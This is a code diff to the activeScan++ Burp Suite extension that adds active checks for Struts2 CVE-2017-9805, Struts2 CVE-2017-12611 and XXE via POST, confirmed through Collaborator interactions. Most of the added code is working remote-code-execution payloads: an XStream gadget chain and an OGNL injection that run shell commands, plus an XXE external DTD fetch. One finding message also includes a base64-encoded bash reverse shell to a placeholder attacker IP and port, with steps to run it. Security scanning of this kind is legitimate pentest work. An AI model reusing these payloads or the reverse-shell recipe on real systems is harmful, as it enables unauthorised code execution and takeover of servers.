@@ -49,6 +49,11 @@ class BurpExtender(IBurpExtender):
         helpers = callbacks.getHelpers()
         callbacks.setExtensionName("activeScan++")
 
+        #gracefully skip checks requiring Collaborator if it's disabled
+        collab_options = callbacks.saveConfigAsJson("project_options.misc.collaborator_server")
+        if '"type":"none"' in collab_options:
+            debug_msg("Collaborator not enabled; skipping checks that require it")
+        
         callbacks.registerScannerCheck(PerHostScans())
         callbacks.registerScannerCheck(PerRequestScans())
 
@@ -57,8 +62,9 @@ class BurpExtender(IBurpExtender):
             callbacks.registerScannerCheck(SuspectTransform())
             callbacks.registerScannerCheck(JetLeak())
             callbacks.registerScannerCheck(SimpleFuzz())
-            callbacks.registerScannerCheck(Solr())
+            if not '"type":"none"' in collab_options: callbacks.registerScannerCheck(Solr())
             callbacks.registerScannerCheck(EdgeSideInclude())
+            if not '"type":"none"' in collab_options: callbacks.registerScannerCheck(doStruts_2017_12611_scan())
 
         print "Successfully loaded activeScan++ v" + VERSION
 
@@ -126,11 +132,14 @@ class PerRequestScans(IScannerCheck):
         if not self.should_trigger_per_request_attacks(basePair, insertionPoint):
             return []
 
+        collab_options = callbacks.saveConfigAsJson("project_options.misc.collaborator_server")
         base_resp_string = safe_bytes_to_string(basePair.getResponse())
         base_resp_print = tagmap(base_resp_string)
         issues = self.doHostHeaderScan(basePair, base_resp_string, base_resp_print)
         issues.extend(self.doCodePathScan(basePair, base_resp_print))
         issues.extend(self.doStrutsScan(basePair))
+        if not '"type":"none"' in collab_options: issues.extend(self.doStruts_2017_9805_Scan(basePair))
+        if not '"type":"none"' in collab_options: issues.extend(self.doXXEPostScan(basePair))
         return issues
 
 
@@ -177,6 +186,118 @@ class PerRequestScans(IScannerCheck):
 
         return []
 
+
+# Based on exploit at https://github.com/chrisjd20/cve-2017-9805.py
+# Tested against https://dev.northpolechristmastown.com/orders.xhtml (SANS Holiday Hack Challenge 2017)
+# Tested against system at https://pentesterlab.com/exercises/s2-052
+    def doStruts_2017_9805_Scan(self, basePair):
+        global callbacks, helpers
+
+        collab = callbacks.createBurpCollaboratorClientContext()
+        collab_payload =collab.generatePayload(True)
+
+        param_pre = '<?xml version="1.0" encoding="utf8"?><map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>'
+        param_post = '</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer/><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>'
+
+        command = "ping</string><string>" + collab_payload + "</string><string>-c1" # platform-agnostic command to check for RCE via DNS interaction
+
+        # print ("\nCommand is: "+command)
+        # whole_param = helpers.buildParameter('body',param_pre + command + param_post,IParameter.PARAM_BODY)
+        whole_param = param_pre + command + param_post
+        # print ('*** The following parameter will be sent:\n\n' + whole_param)
+
+        (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', "application/xml", True) # application/xml seems to work better with Struts while text/xml seems to work better for XXE
+        (ignore, req) = setHeader(req, 'Content-Length', str(len(whole_param)), True)
+
+        ascii_req = '' # Make a copy of the request (byte array) into a string for easier analysis
+        for byte in req:
+            ascii_req += chr(byte)
+
+        if ascii_req.find('\r\n\r\n') > 1: # If 
+            req = req[:ascii_req.find('\r\n\r\n')+4] # strip off any existing message body
+        elif ascii_req.find('\n\n') > 1:
+            req = req[:ascii_req.find('\n\n')+2] # strip off any existing message body
+
+        for chars in whole_param: # Append the payload to the request
+            req.append(ord(chars))
+
+        if req[0] == 71:    # if the reqest starts with G(ET)
+            req = req[3:]    # trim GET
+            i = 0
+            for b in [80,79,83,84]:  # and insert POST
+                req.insert(i,b)
+                i += 1
+
+        ascii_req = ''
+        for byte in req:
+            ascii_req += chr(byte)
+        debug_msg('  The outgoing Struts_2017_9805 request looks like:\n\n' + ascii_req + '\n')
+
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req) # Issue the actual request
+        interactions = collab.fetchAllCollaboratorInteractions() # Check for collaboration
+
+        if interactions:
+            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
+                [attack],
+                'Struts2 CVE-2017-9805 RCE',
+                "The application appears to be vulnerable to CVE-2017-9805, enabling arbitrary code execution. For POC or reverse shell, write a command, put it in Base64 (to keep special chars from breaking XML), and change the nslookup chunk to something like:\n\n'/bin/bash</string><string>-c</string><string>echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tfaXAvYXR0YWNrX3BvcnQgMD4mMQ== | base64 -d | tee -a /tmp/.deleteme.tmp ; /bin/bash /tmp/.deleteme.tmp ; /bin/rm /tmp/.deleteme.tmp'",
+                'Firm', 'High')]
+
+        return []
+
+
+
+
+# Based on the plethora of XXE attacks at https://web-in-security.blogspot.it/2016/03/xxe-cheat-sheet.html
+# Tested against https://pentesterlab.com/exercises/play_xxe
+    def doXXEPostScan(self, basePair):
+        global callbacks, helpers
+
+        collab = callbacks.createBurpCollaboratorClientContext()
+        collab_payload =collab.generatePayload(True)
+
+        xxepayload = '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE data SYSTEM "http://' + collab_payload + '/scanner.dtd"><data>&all;</data>'
+
+        (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', "text/xml", True)
+        (ignore, req) = setHeader(req, 'Content-Length', str(len(xxepayload)), True)
+
+        ascii_req = '' # make a copy of the request in ASCII for easier processing
+        for byte in req:
+            ascii_req += chr(byte)
+
+        if ascii_req.find('\r\n\r\n') > 1:
+            # print('Found \\r\\n\\r\\n at position '+str(ascii_req.find('\r\n\r\n'))+'; stripping all after\n')
+            req = req[:ascii_req.find('\r\n\r\n')+4] # strip off any existing message body
+        elif ascii_req.find('\n\n') > 1:
+            # print('Found \\n\\n at position '+str(ascii_req.find('\n\n'))+'; stripping all after\n')
+            req = req[:ascii_req.find('\n\n')+2] # strip off any existing message body
+
+        for chars in xxepayload: # add the payload as the message body
+            req.append(ord(chars))
+
+        if req[0] == 71:        # if the reqest starts with G(ET)
+            req = req[3:]    # trim GET...
+            i = 0
+            for b in [80,79,83,84]:    # and slip in POST
+                req.insert(i,b)
+                i += 1
+
+        ascii_req = '' # recreate the ASCII request for output to Extender console
+        for byte in req:
+            ascii_req += chr(byte)
+        debug_msg('  The outgoing XXEPostScan request looks like:\n\n' + ascii_req + '\n')
+
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req) # Issue the actual request
+        interactions = collab.fetchAllCollaboratorInteractions() # Check for collaboration
+
+        if interactions:
+            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
+                [attack],
+                'XXE via POST Request',
+                "The application appears to be vulnerable to standard XML eXternal Entity (XXE) via a crafted POST request.  Check the following URL for various method/payload choices:  https://web-in-security.blogspot.it/2016/03/xxe-cheat-sheet.html",
+                'Firm', 'High')]
+
+        return []
 
 
 
@@ -450,6 +571,36 @@ class SuspectTransform(IScannerCheck):
                     break
 
         return issues
+
+    def doPassiveScan(self, basePair):
+        return []
+
+    def consolidateDuplicateIssues(self, existingIssue, newIssue):
+        return is_same_issue(existingIssue, newIssue)
+
+# Based on https://github.com/brianwrf/S2-053-CVE-2017-12611
+# Tested against docker instance at https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053
+class doStruts_2017_12611_scan(IScannerCheck):
+    def doActiveScan(self, basePair, insertionPoint):
+        #global callbacks, helpers
+        collab = callbacks.createBurpCollaboratorClientContext()
+
+        # set the blah blah blah needed before and after the command to be executed
+        param_pre = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"
+        param_post = "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
+        collab_payload = collab.generatePayload(True) # create a Collaborator payload
+        command = "ping " + collab_payload + " -c1" # platform-agnostic command to check for RCE via DNS interaction
+        attack_param = param_pre + command + param_post
+
+        attack = request(basePair, insertionPoint, attack_param) # issue the attack request
+        debug_msg(helpers.analyzeRequest(attack).getUrl())
+        interactions = collab.fetchAllCollaboratorInteractions() # Check for collaboration
+        if interactions:
+            return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
+                'Struts2 CVE-2017-12611 RCE',
+                "The application appears to be vulnerable to CVE-2017-12611, enabling arbitrary code execution.  Replace the ping command in the suspicious request with system commands for a POC.",
+                'Firm', 'High')]
+        return []
 
     def doPassiveScan(self, basePair):
         return []
